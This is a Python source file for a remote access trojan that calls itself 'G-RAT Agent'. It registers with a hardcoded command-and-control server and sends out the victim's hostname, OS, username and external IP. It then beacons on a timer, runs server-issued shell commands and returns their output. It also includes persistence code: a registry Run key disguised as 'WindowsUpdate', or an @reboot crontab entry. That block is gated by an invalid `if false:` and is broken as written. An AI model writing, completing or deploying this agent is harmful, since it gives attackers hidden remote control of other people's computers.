#!/usr/bin/env python3
import os
import sys
import time
import socket
import platform
import uuid
import subprocess
try:
    import requests
except ImportError:
    print("Installing requests module...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

# Configuration
C2_SERVER = "http://192.168.18.173:8080"
BEACON_INTERVAL = 60
AGENT_ID = str(uuid.uuid4())

def register_agent():
    """Register this agent with the C2 server"""
    system_info = {
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "architecture": platform.machine(),
        "username": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
    }
    
    data = {
        "id": AGENT_ID,
        "ip": get_ip(),
        "system_info": system_info
    }
    
    try:
        response = requests.post(
            f"{C2_SERVER}/api/register",
            json=data
        )
        if response.ok:
            return response.json()
        return None
    except Exception as e:
        print(f"Registration failed: {e}")
        return None

def beacon():
    """Send beacon to C2 server"""
    data = {"agent_id": AGENT_ID}
    
    try:
        response = requests.post(
            f"{C2_SERVER}/api/beacon",
            json=data
        )
        return response.ok
    except:
        return False

def get_task():
    """Get task from C2 server"""
    try:
        response = requests.get(
            f"{C2_SERVER}/api/task?agent_id={AGENT_ID}"
        )
        if response.ok:
            return response.json()
        return None
    except:
        return None

def send_result(task_id, output, error, exit_code):
    """Send task result back to C2 server"""
    data = {
        "agent_id": AGENT_ID,
        "task_id": task_id,
        "output": output,
        "error": error,
        "exit_code": exit_code,
        "start_time": time.time(),
        "finish_time": time.time()
    }
    
    try:
        response = requests.post(
            f"{C2_SERVER}/api/result",
            json=data
        )
        return response.ok
    except:
        return False

def execute_command(command):
    """Execute a shell command and return the output"""
    try:
        proc = subprocess.Popen(
            command, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        stdout, stderr = proc.communicate()
        return stdout.decode(), stderr.decode(), proc.returncode
    except Exception as e:
        return "", str(e), 1

def get_ip():
    """Get the agent's external IP address"""
    try:
        response = requests.get("https://api.ipify.org")
        if response.ok:
            return response.text
        return "Unknown"
    except:
        return "Unknown"

def setup_persistence():
    """Setup persistence based on the operating system"""
    if false:
        system = platform.system().lower()
        try:
            if system == "windows":
                # Windows persistence via registry
                import winreg
                key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
                winreg.CloseKey(key)
            elif system == "linux" or system == "darwin":
                # Linux/Mac persistence via crontab
                cron_cmd = f"@reboot {sys.executable} {os.path.abspath(__file__)}"
                subprocess.run(f"(crontab -l 2>/dev/null; echo '{cron_cmd}') | crontab -", shell=True)
        except:
            pass

def main():
    print("G-RAT Agent starting...")
    print(f"Agent ID: {AGENT_ID}")
    
    # Register with C2
    result = register_agent()
    if not result:
        print("Failed to register with C2 server")
        return
    
    print("Successfully registered with C2 server")
    print(f"Beaconing every {BEACON_INTERVAL} seconds")
    
    # Setup persistence if enabled
    setup_persistence()
    
    # Main loop
    try:
        while True:
            # Send beacon
            if beacon():
                print("Beacon sent successfully")
            
            # Get task
            task = get_task()
            if task and task.get("type") != "noop":
                task_id = task.get("id")
                task_type = task.get("type")
                command = task.get("command")
                
                print(f"Received task: {task_type} - {command}")
                
                if task_type == "terminate":
                    print("Received terminate command, exiting...")
                    break
                
                if task_type == "shell":
                    # Execute shell command
                    print(f"Executing command: {command}")
                    output, error, exit_code = execute_command(command)
                    
                    print(f"Command output: {output}")
                    if error:
                        print(f"Command error: {error}")
                    
                    if send_result(task_id, output, error, exit_code):
                        print("Result sent successfully")
                    else:
                        print("Failed to send result")
            
            # Sleep before next beacon
            time.sleep(BEACON_INTERVAL)
    except KeyboardInterrupt:
        print("Agent terminated by user")
    
if __name__ == "__main__":
    main()
